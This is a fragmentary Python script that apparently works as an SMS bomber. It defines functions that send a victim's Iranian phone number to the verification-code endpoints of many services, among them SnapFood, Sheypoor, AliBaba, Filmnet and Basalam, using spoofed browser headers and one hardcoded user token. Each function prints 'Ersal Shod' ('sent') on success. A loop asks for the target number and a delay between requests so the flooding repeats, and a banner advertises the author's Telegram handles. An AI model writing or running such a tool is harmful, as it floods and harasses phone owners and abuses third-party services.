...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    ...
    try:
        ...
        if sfoodR['status'] == True:
            print(f'{g}(SnapFood) {w}Ersal Shod.')
            return True
    except:
        pass
...
def sheypoor(phone):
    ...
    try:
        ...
        if sheyporR['success'] == True:
            print(f'{g}(Sheypoor) {w}Ersal Shod.')
            return True
    except:
        pass
...
'x-xsrf-token': ''}
    try:
        ...
        if 'success' in okR:
            print(f'{g}(OfoghKourosh) {w}Ersal Shod.')
            return True
    except:
        pass
...
def alibaba(phone):
    ...
    try:
        ...
        if alibabaR["result"]["success"] == True:
            print(f'{g}(AliBaba) {w}Ersal Shod.')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if smarketR['status'] == True:
            print(f'{g}(SnapMarket) {w}Ersal Shod.')
            return True
    except:
        pass
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        if gaR['Code'] == 1:
            print(f'{g}(GapFilm) {w}Ersal Shod.')
            return True
    except:
        pass
def sTrip(phone):
...
def filmnet(phone):
    ...
    try:
        ...
        if Filmnet['meta']['operation_result'] == 'success':
            print(f'{g}(Filmnet) {w}Ersal Shod.')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok['status'] == True:
            print(f'{g}(AnarGift) {w}Ersal Shod.')
            return True
    except :
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'ok':
            print(f'{g}(Chamedoon) {w}Ersal Shod.')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'
    ...
    try:
        ...
        if ok["status"] == 'success':
            print(f'{g}(BaniMode) {w}Ersal Shod.')
            return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
            print(f'{g}(NashrOlgoo) {w}Ersal Shod.')
            return True
    except:
        pass
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ...
        if ok['code'] == '1':
            print(f'{g}(PakhshShop) {w}Ersal Shod.')
            return True
    except:
        pass
def didnegar(phone):
...
'x-requested-with': 'XMLHttpRequest'}
    try:
        ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
        if ok['code'] == '1':
            print(f'{g}(DideNegar) {w}Ersal Shod.')
            return True
    except:
        pass
def baskol(phone):
...
'x-creation-tags': '{"app":"web","client":"customer","os":"linux","device":"desktop","uri":"/accounts","fullPath":"/accounts","utms":"organic","landing_url":"basalam.com%2Faccounts","tag":[null]}'}
    try:
        ...
        if ok.status_code == 200:
            print(f'{g}(BaSalam) {w}Ersal Shod.')
            return True
    except:
        pass
def see5(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok["Parameters"] != None:
            print(f'{g}(Ghabzino) {w}Ersal Shod.')
            return True
    except:
        pass
def simkhanF(phone):
...
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
            print(f'{g}(SimKhan) {w}Ersal Shod.')
            return True
    except:
        pass
def simkhanT(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 OPR/82.0.4227.23'}
    try:
        ...
        if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
            print(f'{g}(DrSaina) {w}Ersal Shod.')
            return True
    except:
        pass
def binjo(phone):
...
'user-token': 'swS1oSzN22kTVTI8DqtRhUrgUfsKBiRdBeosjlczNV07XSbeVHB7R622Mw9O7uzp'}
    try:
        ...
        if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
            print(f'{g}(BimitoVip) {w}Ersal Shod.')
            return True
    except:
        pass
def bimitoVip(phone):
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
    try:
        ...
        print(f'{g}(SeebIrani) {w}Ersal Shod.')
        return True
    except:
        pass
...
'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
    try:
        ...
        print(f'{g}(MihanPezeshk) {w}Ersal Shod.')
        return True
    except:
        pass
def mek(phone):
...
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0"
    ...
    try:
        ...
        if meR['isSuccess']:
            print(f'{g}(HamrahMechanic) {w}Ersal Shod.')
            return True
    except: pass
# ================================[SEND SMS FUNC]================================
...
y='\033[1;33m'
w='\033[1;37m'
printLow(f'{r}By Shayan Rocactor\n\n{y}Info:\n    {g}[+] {y}ID For Telegram {w}@Shayan_Cybri \n    {g}[+] {y}Telegram Channel: {w}@Motalashu\n   \n{y}system:\n    {g}[+] {y}Platform: {w}{System}\n    {g}[+] {y}Node: {w}{Node}\n    {g}[+] {y}Release: {w}{Release}\n\n')
def Vip(phone, Time):
...
while True:
    phone = is_phone(input(f'{g}[?] {y}Shomare Ro Bezan Bedon 0 {g}(+98) {r}- {w}'))
    if phone:
        break
try:
    Time = float(input(f'{g}[?] {y}Time Max Kardan Beyn Darkhast Ferestadan Code Ro Vared Konid. {g}[Az In Time Shoro Mishe=0.1] {r}- {w}'))
except ValueError:
    Time = 0.1
